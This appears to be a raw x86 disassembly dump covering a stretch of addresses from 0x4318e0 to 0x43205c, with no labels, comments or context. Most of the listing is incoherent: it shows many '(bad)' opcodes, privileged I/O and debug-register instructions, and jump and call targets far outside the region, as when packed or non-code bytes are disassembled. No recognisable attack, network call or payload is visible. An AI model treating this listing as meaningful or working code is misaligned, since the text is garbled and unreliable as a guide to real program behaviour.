  4318e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4318e6:	enter  0x8401,0x0
  4318ea:	add    al,BYTE PTR [eax]
  4318ec:	add    bh,bh
  4318ee:	out    dx,eax
  4318ef:	sbb    BYTE PTR [eax],al
  4318f1:	dec    ebp
  4318f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4318f8:	sub    esi,DWORD PTR [ebx]
  4318fa:	mov    ebp,DWORD PTR [eax-0x8]
  4318fd:	add    bl,0x0
  431900:	(bad)  
  431901:	cmp    eax,ecx
  431903:	or     BYTE PTR [edx+0x750114],al
  431909:	inc    DWORD PTR [ebp+0x18]
  43190c:	mov    eax,DWORD PTR [ebp-0x8]
  43190f:	mov    ebx,eax
  431911:	(bad)  
  431912:	retf   
  431913:	inc    ebp
  431914:	into   
  431915:	mov    esi,eax
  431917:	int3   
  431918:	scas   eax,DWORD PTR es:[edi]
  431919:	push   es
  43191a:	mov    esi,DWORD PTR [ebp-0xc]
  43191d:	call   DWORD PTR [ebp+0x18]
  431920:	sub    edi,DWORD PTR [ebp+0x3b]
  431923:	mov    esi,DWORD PTR [edi-0x34]
  431926:	mov    eax,DWORD PTR [ebp-0x8]
  431929:	ss ret 
  43192b:	pushf  
  43192c:	mov    bh,0xbc
  43192f:	fadd   QWORD PTR [eax]
  431931:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431937:	mov    esi,DWORD PTR [ebx]
  431939:	in     al,0x33
  43193b:	ret    
  43193c:	add    eax,esi
  43193e:	add    eax,DWORD PTR [ebp+0xf]
  431941:	mov    eax,ecx
  431943:	in     al,0x4d
  431945:	ret    
  431946:	mov    eax,esi
  431948:	in     al,dx
  431949:	inc    ebp
  43194a:	rol    edi,1
  43194c:	sar    al,1
  43194e:	or     BYTE PTR [ebp+0x45e9f845],al
  431954:	add    BYTE PTR [eax],bh
  431956:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43195d:	test   ebx,eax
  43195f:	clc    
  431960:	retf   
  431961:	inc    ebp
  431962:	into   
  431963:	cmp    al,dh
  431965:	pushf  
  431966:	scas   eax,DWORD PTR es:[edi]
  431967:	(bad)  
  431968:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43196f:	inc    ebp
  431970:	cmp    edi,DWORD PTR [edi+esi*2]
  431973:	pushf  
  431974:	mov    eax,edi
  431976:	mov    esp,0x458567a8
  43197b:	clc    
  43197c:	mov    eax,DWORD PTR [ebp-0x8]
  43197f:	mov    eax,ebx
  431981:	in     al,dx
  431982:	retf   
  431983:	ret    
  431984:	into   
  431985:	mov    dh,0x7d
  431988:	scas   eax,DWORD PTR es:[edi]
  431989:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43198f:	add    BYTE PTR [ebx],ch
  431991:	jmp    0xba1ad1
  431996:	mov    eax,DWORD PTR [ebp-0x5c]
  431999:	mov    eax,DWORD PTR [ebp-0x14]
  43199c:	inc    ebp
  43199d:	enter  0x458b,0xf8
  4319a1:	xor    eax,ebx
  4319a3:	add    ecx,ebx
  4319a5:	cmp    ecx,esi
  4319a7:	shufps xmm7,xmm4,0xaf
  4319ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4319b1:	dec    ebp
  4319b2:	sub    esi,DWORD PTR [ebx]
  4319b4:	cmp    esi,DWORD PTR [ebx]
  4319b6:	ja     0x4319bb
  4319b8:	mov    eax,DWORD PTR [ebx]
  4319ba:	lods   al,BYTE PTR ds:[esi]
  4319bb:	mov    db0,ecx
  4319be:	inc    ebp
  4319bf:	dec    ebp
  4319c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4319c6:	retf   
  4319c7:	rol    dh,1
  4319c9:	or     al,0xce
  4319cb:	inc    ebp
  4319cc:	scas   eax,DWORD PTR es:[edi]
  4319cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4319d3:	add    BYTE PTR [ebx],ch
  4319d5:	add    BYTE PTR [ebx],bh
  4319d7:	inc    ebp
  4319d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4319de:	inc    ebp
  4319df:	retf   
  4319e0:	mov    ecx,esi
  4319e2:	clc    
  4319e3:	(bad)  
  4319e4:	retf   
  4319e5:	scas   eax,DWORD PTR es:[edi]
  4319e6:	ret    
  4319e7:	mov    ecx,esi
  4319e9:	hlt    
  4319ea:	(bad)  
  4319eb:	push   ebp
  4319ec:	scas   eax,DWORD PTR es:[edi]
  4319ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4319f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4319f9:	add    BYTE PTR [ebx],al
  4319fb:	mov    eax,eax
  4319fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4319fe:	inc    ebp
  4319ff:	dec    ebp
  431a00:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a08:	inc    ebp
  431a09:	(bad)  
  431a0b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a13:	sar    eax,1
  431a15:	rol    BYTE PTR [ebp+0x5],1
  431a18:	xor    eax,DWORD PTR [ebp+0x3]
  431a1b:	jmp    0x431a08
  431a1d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431a23:	xor    eax,DWORD PTR [ebp+0x33]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	rol    BYTE PTR [ebx],1
  431a2a:	test   BYTE PTR [edi],cl
  431a2c:	cdq    
  431a2d:	shl    DWORD PTR [edx],0x4d
  431a30:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431a36:	xor    edx,eax
  431a38:	add    eax,DWORD PTR ds:0xeb4d45e0
  431a3e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431a44:	add    BYTE PTR [ebx],dh
  431a46:	inc    ebp
  431a47:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431a4d:	rdpmc  
  431a4f:	rol    DWORD PTR [ebx],0x4d
  431a52:	loopne 0x4319df
  431a54:	push   ebp
  431a55:	in     al,dx
  431a56:	mov    cl,dl
  431a58:	adc    eax,edx
  431a5a:	jb     0x431a61
  431a5c:	add    BYTE PTR [ebp+0x45],al
  431a5f:	jmp    0x4319ec
  431a61:	mov    ebx,eax
  431a63:	test   al,0xcb
  431a65:	dec    ebp
  431a66:	dec    ebp
  431a67:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431a6d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431a73:	dec    ebp
  431a74:	mov    al,0x8b
  431a76:	dec    ebp
  431a77:	in     al,dx
  431a78:	xor    edx,ecx
  431a7a:	xor    edx,eax
  431a7c:	add    eax,DWORD PTR [ebp+0x3]
  431a7f:	jbe    0x431a90
  431a81:	mov    eax,ecx
  431a83:	test   al,0x45
  431a85:	dec    ebp
  431a86:	mov    DWORD PTR [ebx],esi
  431a88:	loopne 0x431abd
  431a8a:	inc    ebp
  431a8b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431a91:	rol    esi,0x45
  431a94:	scas   eax,DWORD PTR es:[edi]
  431a95:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431a9b:	mov    eax,ecx
  431a9d:	hlt    
  431a9e:	dec    ebp
  431a9f:	inc    ebp
  431aa0:	mov    eax,edi
  431aa2:	loopne 0x431a7c
  431aa4:	retf   
  431aa5:	test   esi,ecx
  431aa7:	clc    
  431aa8:	scas   eax,DWORD PTR es:[edi]
  431aa9:	inc    ebp
  431aaa:	mov    eax,edi
  431aac:	fdiv   st,st(0)
  431aae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431ab4:	cdq    
  431ab5:	cmp    BYTE PTR [edx],dh
  431ab7:	pushf  
  431ab8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431abe:	inc    esi
  431ac0:	mov    ebp,DWORD PTR [eax-0x10]
  431ac3:	inc    ebp
  431ac4:	dec    ebp
  431ac5:	xor    esi,DWORD PTR [ebx]
  431ac7:	add    eax,DWORD PTR [ebx]
  431ac9:	loopne 0x431ada
  431acb:	dec    ebp
  431acc:	ror    DWORD PTR [edx+0x7233084d],0x3
  431ad3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431ad9:	lock cdq 
  431adb:	ret    
  431adc:	xor    al,BYTE PTR [ebp-0x77]
  431adf:	mov    esi,esp
  431ae1:	rol    BYTE PTR [ebp-0x7c],1
  431ae4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431aea:	call   edi
  431aec:	enter  0x4d45,0x8b
  431af0:	mov    esi,eax
  431af2:	fmul   st(3),st
  431af4:	push   ebp
  431af5:	dec    ebp
  431af6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431afc:	ret    0xc199
  431aff:	xor    al,BYTE PTR [esi-0x280276]
  431b05:	dec    ebp
  431b06:	jne    0x431b3b
  431b08:	mov    eax,DWORD PTR [ebx]
  431b0a:	cld    
  431b0b:	loopne 0x431abd
  431b0d:	push   ebp
  431b0e:	add    DWORD PTR [eax+0x72851100],ecx
  431b14:	inc    DWORD PTR [eax]
  431b16:	inc    DWORD PTR [ebp-0x75]
  431b19:	mov    edi,esp
  431b1b:	lock add bl,0x1
  431b1f:	retf   
  431b20:	add    dh,al
  431b22:	xor    dh,cl
  431b24:	inc    ebp
  431b25:	scas   eax,DWORD PTR es:[edi]
  431b26:	mov    eax,DWORD PTR [ebx]
  431b28:	shl    al,0x0
  431b2b:	inc    ebp
  431b2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431b32:	call   0x462d6a
  431b37:	ud0    eax,ecx
  431b3a:	adc    al,0x4d
  431b3c:	inc    ebp
  431b3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431b43:	lock push 0x338055
  431b49:	add    eax,DWORD PTR [eax]
  431b4b:	ud0    ecx,edx
  431b4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431b51:	xor    ecx,ecx
  431b53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431b5a:	push   ecx
  431b5b:	add    BYTE PTR [ebp-0x38],cl
  431b5e:	mov    DWORD PTR [esi-0x740004],eax
  431b64:	cld    
  431b65:	inc    ebp
  431b66:	nop
  431b67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431b6d:	xabort 0xaf
  431b70:	icebp  
  431b71:	mov    esi,DWORD PTR [ebp-0x28]
  431b74:	(bad)  
  431b75:	retf   
  431b76:	or     ecx,eax
  431b78:	(bad)  
  431b79:	dec    ebp
  431b7a:	pop    es
  431b7b:	(bad)  
  431b7c:	(bad)  
  431b7d:	or     BYTE PTR [esi],al
  431b7f:	jb     0x431b47
  431b81:	add    BYTE PTR [ebx],al
  431b83:	inc    ebp
  431b84:	(bad)  
  431b85:	mov    ecx,DWORD PTR [edx]
  431b87:	fadd   st(6),st
  431b89:	ret    
  431b8a:	add    ah,BYTE PTR [edi-0x37]
  431b8d:	int    0x55
  431b8f:	sub    ebp,esp
  431b91:	add    edx,DWORD PTR [ecx-0x14]
  431b94:	inc    ebp
  431b95:	inc    ebp
  431b96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431b9c:	cld    
  431b9d:	(bad)  
  431b9e:	mov    WORD PTR [edi+0xf893be0],gs
  431ba4:	mov    ebp,ebp
  431ba6:	clc    
  431ba7:	push   eax
  431ba9:	push   DWORD PTR [ebp-0x4]
  431bac:	mov    BYTE PTR [ebp+0xa],0xff
  431bb0:	(bad)  
  431bb1:	int3   
  431bb2:	or     BYTE PTR [eax],al
  431bb4:	(bad)  
  431bb5:	lea    eax,[edi]
  431bb7:	ins    BYTE PTR es:[edi],dx
  431bb8:	(bad)  
  431bb9:	inc    DWORD PTR [ecx]
  431bbb:	push   eax
  431bbc:	mov    BYTE PTR [ebp+0x9],0x8b
  431bc0:	leave  
  431bc1:	les    edx,FWORD PTR [ebp+0x0]
  431bc4:	in     al,dx
  431bc5:	call   DWORD PTR [ecx-0x75]
  431bc8:	inc    ebp
  431bc9:	cld    
  431bca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431bd0:	cld    
  431bd1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431bd7:	std    
  431bd8:	mov    eax,DWORD PTR [eax]
  431bda:	clc    
  431bdb:	test   eax,esi
  431bdd:	je     0x431c54
  431bdf:	mov    eax,esi
  431be1:	cld    
  431be2:	add    al,0x80
  431be4:	add    WORD PTR [ecx+0x0],ax
  431be8:	fiadd  DWORD PTR [eax]
  431bea:	mov    BYTE PTR [eax],0xd6
  431bed:	push   0xffffffc3
  431bef:	push   edi
  431bf0:	mov    edx,DWORD PTR [eax+0x51]
  431bf3:	pop    edi
  431bf4:	lea    ebx,[ebx-0x8]
  431bf7:	ret    0x45
  431bfa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c00:	xchg   eax,edi
  431c02:	mov    DWORD PTR [ebp-0x75],ecx
  431c05:	push   esi
  431c06:	clc    
  431c07:	jne    0x431bd9
  431c09:	mov    ecx,0xf8450b0b
  431c0e:	(bad)  
  431c0f:	push   cs
  431c10:	or     BYTE PTR [ebp-0x3a],dh
  431c13:	cmp    eax,DWORD PTR [ecx]
  431c15:	pop    esi
  431c16:	(bad)  
  431c17:	or     al,0x5
  431c19:	inc    eax
  431c1a:	leave  
  431c1b:	jmp    0x40cf:0x21564204
  431c22:	leave  
  431c23:	jmp    0xdace5d27
  431c28:	mov    eax,DWORD PTR [edx-0x3a]
  431c2b:	jle    0x431c23
  431c2d:	inc    eax
  431c2e:	nop
  431c2f:	in     al,dx
  431c30:	inc    ebx
  431c32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431c38:	add    eax,0xff45e8f8
  431c3d:	push   esi
  431c3e:	push   DWORD PTR [ebp-0x39]
  431c41:	mov    eax,0x7e9da46
  431c46:	or     al,0x6
  431c48:	push   DWORD PTR [ebp-0x3a]
  431c4b:	cmp    eax,DWORD PTR [edx]
  431c4d:	pop    esi
  431c4e:	ret    
  431c4f:	or     al,0x56
  431c51:	inc    ecx
  431c52:	push   ebp
  431c53:	jle    0x431c41
  431c55:	inc    edx
  431c56:	inc    ebp
  431c57:	leave  
  431c58:	add    DWORD PTR [ecx+0x28],eax
  431c5b:	and    esp,edi
  431c5d:	inc    ecx
  431c5e:	jne    0x431c47
  431c60:	add    DWORD PTR [edx+0x1c],eax
  431c63:	retf   0xc38b
  431c66:	adc    al,0x8b
  431c68:	xchg   edx,eax
  431c69:	push   ecx
  431c6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431c70:	rcl    DWORD PTR [esi-0x9],cl
  431c73:	jne    0x431cc5
  431c75:	mov    eax,0x7c80ece
  431c7a:	rol    DWORD PTR [esi],cl
  431c7c:	div    DWORD PTR [ebp+0x50]
  431c7f:	cmp    ecx,edx
  431c81:	pop    esi
  431c82:	dec    BYTE PTR [edx]
  431c84:	in     al,dx
  431c85:	inc    edx
  431c86:	sub    ebp,ebp
  431c88:	inc    eax
  431c89:	(bad)  
  431c8a:	push   eax
  431c8b:	add    edx,DWORD PTR [eax-0x13]
  431c8e:	push   edi
  431c8f:	add    dh,dh
  431c91:	leave  
  431c92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431c96:	add    BYTE PTR [ecx+0x0],dl
  431c99:	inc    ebp
  431c9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ca0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ca6:	add    al,0x2
  431ca8:	jmp    0x57ec802
  431cad:	jne    0x431c97
  431caf:	mov    eax,DWORD PTR [edx]
  431cb1:	or     BYTE PTR [eax],al
  431cb3:	inc    ecx
  431cb4:	stc    
  431cb5:	jmp    0xe7825cf0
  431cba:	jge    0x431cfd
  431cbc:	mov    esi,ebp
  431cbe:	lock ret 0x7d
  431cc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431cc8:	add    bh,bh
  431cca:	aad    0xd7
  431ccc:	add    dh,cl
  431cce:	clts   
  431cd0:	(bad)  
  431cd1:	call   0xffce1bd6
  431cd6:	hlt    
  431cd7:	iret   
  431cd8:	jge    0x431cb0
  431cda:	rol    DWORD PTR [esi-0x80],cl
  431cdd:	cmc    
  431cde:	or     BYTE PTR [edi-0x27],cl
  431ce1:	(bad)  
  431ce2:	out    dx,al
  431ce3:	mov    eax,DWORD PTR [ebx]
  431ce5:	(bad)  
  431ce6:	pop    esi
  431ce7:	push   es
  431ce8:	cmp    al,0xe8
  431cea:	sar    edi,0x8
  431ced:	inc    DWORD PTR [edi]
  431cef:	inc    esi
  431cf0:	(bad)  
  431cf1:	in     al,dx
  431cf2:	jle    0x431d4b
  431cf4:	push   cs
  431cf5:	push   ebx
  431cf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431cfc:	add    BYTE PTR [ebp+0x50],al
  431cff:	push   eax
  431d00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d06:	sub    edx,DWORD PTR [esi-0x24]
  431d09:	jne    0x431cc1
  431d0b:	lods   eax,DWORD PTR ds:[esi]
  431d0c:	mov    edx,DWORD PTR [edx-0x34]
  431d0f:	dec    esi
  431d10:	out    0x83,eax
  431d12:	into   
  431d13:	push   edi
  431d15:	loopne 0x431ce5
  431d17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431d22:	rol    DWORD PTR [edx],0x8
  431d25:	mov    esp,ecx
  431d27:	cmp    DWORD PTR [ebx],0xc
  431d2a:	mov    esi,0x5001c0
  431d2f:	push   eax
  431d30:	push   cs
  431d31:	push   eax
  431d32:	(bad)  
  431d33:	sub    edx,edi
  431d35:	push   esi
  431d36:	adc    al,0xcb
  431d38:	ins    DWORD PTR es:[edi],dx
  431d39:	mov    eax,0x203e8
  431d3e:	add    al,ah
  431d40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431d47:	add    dh,al
  431d49:	add    ah,ch
  431d4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431d51:	pop    ecx
  431d52:	or     eax,ebx
  431d54:	cli    
  431d55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431d5b:	lea    ebp,[ebx]
  431d5d:	mov    edx,DWORD PTR [edx-0x4]
  431d60:	dec    ecx
  431d61:	inc    ebp
  431d62:	shr    BYTE PTR [ebx],0x4b
  431d65:	and    al,0x0
  431d67:	(bad)  
  431d68:	jne    0x431daf
  431d6a:	pop    eax
  431d6b:	mov    al,0x5a
  431d6d:	call   0x1421fcc
  431d72:	and    al,0x85
  431d74:	push   edx
  431d75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431d79:	dec    ebp
  431d7a:	mov    cl,0x23
  431d7c:	jmp    0x431d6a
  431d7e:	mov    al,0xe7
  431d80:	call   0x139206e
  431d85:	shr    DWORD PTR [eax+ebx*2],cl
  431d88:	lock (bad) 
  431d8a:	adc    eax,0x757f008d
  431d8f:	out    0x58,eax
  431d91:	cmp    al,0x7
  431d93:	pop    edx
  431d94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431d9b:	push   ecx
  431d9c:	cld    
  431d9d:	mov    esi,0x3b0175
  431da2:	and    al,0xb0
  431da4:	xor    BYTE PTR [edx+0x1],0x8b
  431da8:	add    ah,bh
  431daa:	mov    edi,DWORD PTR [ebp-0x4]
  431dad:	psubsw mm7,QWORD PTR [edi]
  431db0:	add    DWORD PTR [ebp+0x0],ebp
  431db3:	rcr    eax,1
  431db5:	mov    edi,ecx
  431db7:	and    eax,DWORD PTR [eax]
  431db9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431dbf:	call   0x13020a8
  431dc4:	add    al,cl
  431dc6:	mov    ebp,esi
  431dc8:	aam    0x83
  431dca:	or     DWORD PTR [ecx],eax
  431dcc:	jne    0x431dbf
  431dce:	mov    eax,DWORD PTR [eax]
  431dd0:	aam    0x0
  431dd2:	dec    ebp
  431dd3:	jne    0x431d60
  431dd5:	cmp    ebx,eax
  431dd7:	jb     0x431e26
  431dd9:	jmp    0x431d66
  431ddb:	mov    ebx,esp
  431ddd:	int3   
  431dde:	dec    ebp
  431ddf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431de6:	mov    edx,0x8b0a8b
  431deb:	cmp    ecx,DWORD PTR [eax]
  431ded:	jb     0x431dc6
  431def:	pop    edx
  431df0:	push   edi
  431df1:	cli    
  431df2:	pop    es
  431df3:	mov    eax,ecx
  431df5:	jb     0x431df9
  431df7:	add    DWORD PTR [ebx],0xa
  431dfa:	mov    eax,DWORD PTR [ebx]
  431dfc:	int3   
  431dfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431e03:	jmp    0x431d90
  431e05:	mov    al,0xe8
  431e07:	call   0x1042089
  431e0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e0f:	pop    edi
  431e10:	or     BYTE PTR [ecx-0x73],bl
  431e13:	pop    ecx
  431e14:	inc    edi
  431e15:	xor    al,0xeb
  431e17:	push   ecx
  431e18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e1e:	call   0xb21f23
  431e23:	int3   
  431e24:	sbb    BYTE PTR [esi],ch
  431e26:	inc    ebp
  431e27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431e2d:	call   0x9c209c
  431e32:	or     BYTE PTR [ebx-0x73],dl
  431e35:	cmp    al,0x47
  431e37:	mov    al,0x1
  431e39:	jb     0x431e3b
  431e3b:	mov    al,0x10
  431e3d:	push   eax
  431e3e:	add    al,0x75
  431e40:	add    BYTE PTR [ebx],ch
  431e42:	add    ebx,esp
  431e44:	int3   
  431e45:	jne    0x431e57
  431e47:	movsx  edx,cl
  431e4a:	add    DWORD PTR [eax],eax
  431e4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431e53:	mov    gs,edi
  431e55:	add    BYTE PTR [eax-0x50],ch
  431e58:	add    al,ch
  431e5a:	mov    eax,DWORD PTR [ecx]
  431e5c:	sub    eax,DWORD PTR [eax]
  431e5e:	jb     0x431ed5
  431e60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431e64:	jge    0x431e4e
  431e66:	add    al,0x1
  431e68:	add    DWORD PTR [eax],0x0
  431e6b:	jne    0x431e6d
  431e6d:	je     0x431eb4
  431e6f:	mov    eax,DWORD PTR [edi]
  431e71:	ror    BYTE PTR [ebp+0x4d],1
  431e74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431e7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431e81:	mov    DWORD PTR [ebx],ebp
  431e83:	fadd   DWORD PTR [eax+0x75]
  431e86:	inc    eax
  431e87:	pop    eax
  431e88:	lea    ebx,[ecx+0x4f]
  431e8b:	push   0xb1000003
  431e90:	out    dx,eax
  431e91:	add    ebp,DWORD PTR [edx+edx*2]
  431e94:	add    BYTE PTR [ebx+ecx*4],bh
  431e97:	mov    ch,BYTE PTR [ebx]
  431e99:	jb     0x431f0d
  431e9b:	add    al,0x89
  431e9d:	push   eax
  431e9e:	call   0x842b6c10
  431ea3:	add    DWORD PTR [eax+eax*1],eax
  431ea6:	jae    0x431ebc
  431ea8:	icebp  
  431ea9:	inc    ebp
  431eaa:	mov    eax,DWORD PTR gs:[ecx]
  431ead:	int3   
  431eae:	out    dx,al
  431eaf:	loopne 0x431efe
  431eb1:	sub    eax,DWORD PTR [edx]
  431eb3:	push   0xffffff83
  431eb5:	pop    esi
  431eb6:	push   cs
  431eb7:	jl     0x431ed2
  431eb9:	add    al,0xaf
  431ebb:	xor    eax,0x832b6d00
  431ec0:	mov    eax,DWORD PTR [edx]
  431ec2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431ec8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431ece:	inc    ebp
  431ecf:	shr    ebx,0x3
  431ed2:	or     DWORD PTR [eax],0x4
  431ed5:	push   0xffffffa5
  431ed7:	pop    esi
  431ed8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431edf:	jmp    0x431f3e
  431ee1:	mov    edi,0xff0272
  431ee6:	fdivr  QWORD PTR [ebp+0x5d]
  431ee9:	push   0x4e
  431eeb:	pop    ecx
  431eec:	call   0x4362f1
  431ef1:	mov    DWORD PTR [ebx],eax
  431ef3:	in     al,0xc8
  431ef5:	rol    BYTE PTR [ebp-0x75],0xc1
  431ef9:	call   0xad20da
  431efe:	pop    esi
  431eff:	enter  0xceff,0x8b
  431f03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f0e:	je     0x431f10
  431f10:	or     DWORD PTR [ebx-0x74183b24],eax
  431f16:	jne    0x431efc
  431f18:	jmp    0x431f13
  431f1a:	push   DWORD PTR [edx-0x24]
  431f1d:	push   0x4d
  431f1f:	pop    ecx
  431f20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431f24:	jge    0x431f2c
  431f26:	mov    eax,eax
  431f28:	sub    ebp,DWORD PTR [edx+0x24]
  431f2b:	pop    esi
  431f2c:	inc    ebp
  431f2d:	mov    esp,0x8b6077
  431f32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431f38:	lods   al,BYTE PTR ds:[esi]
  431f39:	add    BYTE PTR [ebx],bh
  431f3b:	enter  0xce73,0x49
  431f3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431f47:	stc    
  431f48:	jge    0x431fbc
  431f4a:	jnp    0xdd42a2b9
  431f50:	call   0xc62026
  431f55:	fadd   st(0),st
  431f57:	dec    esi
  431f58:	ins    BYTE PTR es:[edi],dx
  431f59:	stc    
  431f5a:	cmp    al,0x73
  431f5c:	push   ebp
  431f5d:	mov    eax,0xf8028b
  431f62:	jne    0x431f25
  431f64:	mov    esi,ecx
  431f66:	mov    esp,DWORD PTR [ebp+0x2c]
  431f69:	add    edi,DWORD PTR [ebp-0x24]
  431f6c:	sub    esp,eax
  431f6e:	and    al,0x45
  431f70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431f76:	sbb    al,0xee
  431f78:	pop    esi
  431f79:	call   0x831fa9
  431f7e:	fsubr  st,st(3)
  431f80:	sti    
  431f81:	add    BYTE PTR gs:[ecx],bh
  431f84:	add    eax,esp
  431f86:	add    DWORD PTR [esi],eax
  431f88:	rol    DWORD PTR [ebp+0x8],0x29
  431f8c:	mov    esp,eax
  431f8e:	clc    
  431f8f:	jne    0x432006
  431f91:	mov    eax,0x8b0673
  431f96:	loopne 0x431fdd
  431f98:	loopne 0x431f23
  431f9a:	lods   al,BYTE PTR ds:[esi]
  431f9b:	int3   
  431f9c:	inc    ebp
  431f9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431fa1:	add    al,0xc3
  431fa3:	sub    ecx,DWORD PTR [ebp+0x47]
  431fa6:	(bad)  
  431fa8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431fac:	add    eax,DWORD PTR [eax]
  431fae:	call   0x644e0b3
  431fb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431fb9:	dec    esi
  431fba:	ins    DWORD PTR es:[edi],dx
  431fbb:	in     al,dx
  431fbc:	lea    eax,[eax]
  431fbe:	inc    ebp
  431fbf:	inc    ebp
  431fc0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431fc6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431fd0:	and    al,0xdc
  431fd2:	ror    DWORD PTR [edx+0x24],0xf7
  431fd6:	or     BYTE PTR [ebp+0x4c],dh
  431fd9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431fdd:	stos   BYTE PTR es:[edi],al
  431fde:	adc    edx,edi
  431fe0:	inc    esp
  431fe1:	add    edi,DWORD PTR [eax]
  431fe3:	jne    0x431fc8
  431fe5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431feb:	cmp    ecx,DWORD PTR [edi]
  431fed:	sub    BYTE PTR [ebp-0x7e],dl
  431ff0:	sar    ebp,0xb
  431ff3:	jmp    FWORD PTR [edi+0x2400392a]
  431ff9:	sub    esi,DWORD PTR [ebx-0x73]
  431ffc:	mov    esp,DWORD PTR [ecx+edi*4]
  431fff:	mov    ecx,DWORD PTR [eax]
  432001:	and    BYTE PTR [eax],al
  432003:	jne    0x431fcf
  432005:	sub    ebp,ecx
  432007:	sbb    BYTE PTR [esi+0x32],ah
  43200a:	dec    ebp
  43200b:	push   ebp
  43200c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432012:	ret    
  432013:	mov    edx,ebp
  432015:	leave  
  432016:	sub    DWORD PTR [esi+0x24],ebx
  432019:	ret    0x2b
  43201c:	pop    ax
  43201e:	push   ebp
  43201f:	rol    BYTE PTR [ebx],0xeb
  432022:	add    DWORD PTR [ecx+0x6c0001],0x40
  432029:	jb     0x432080
  43202b:	ret    
  43202c:	in     al,dx
  43202d:	jecxz  0x431fba
  43202f:	push   esi
  432030:	xchg   esp,eax
  432031:	jne    0x432033
  432033:	cmp    edx,DWORD PTR [esi+0x1c]
  432036:	jne    0x43201c
  432038:	mov    eax,DWORD PTR [ebp-0x77]
  43203b:	ror    DWORD PTR [ebx+0x899408],0xe0
  432042:	mov    esi,DWORD PTR [ebp-0x75]
  432045:	pop    esi
  432046:	nop
  432047:	mov    eax,DWORD PTR [eax]
  432049:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  43204f:	add    al,0x0
  432051:	inc    ebp
  432052:	mov    eax,DWORD PTR [ebx]
  432054:	mov    ebp,ebx
  432056:	cmp    al,0xf
  432058:	or     al,al
  43205a:	inc    ebp
  43205b:	inc    ebp
  43205c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
